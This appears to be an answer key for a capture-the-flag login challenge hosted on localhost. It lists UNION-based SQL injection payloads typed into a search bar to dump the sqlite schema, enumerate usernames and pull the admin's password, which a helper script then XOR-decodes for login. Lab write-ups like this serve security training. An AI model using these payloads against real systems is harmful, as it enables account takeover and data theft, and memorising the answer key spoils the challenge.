## Login #4 Answer
Sources in `ch4.py`
### Instructions:
1. Find the tables made in the sqlite db using the following command in the search bar on `/search`:
```
y" UNION SELECT sql FROM sqlite_schema; --
```
2. Find all usernames in the members database by running
```
y" UNION SELECT username FROM members WHERE True; -- 
```
3. Find the admin's password 
```
y" UNION SELECT hashed_password FROM members where username = "admin"; -- 
```
4. Run `ch4.py` which decodes the hex to a string after XORing with Oxa5
5. Enter `admin` in username box
6. Enter password returned from `ch4.py` in password box at `localhost:8080`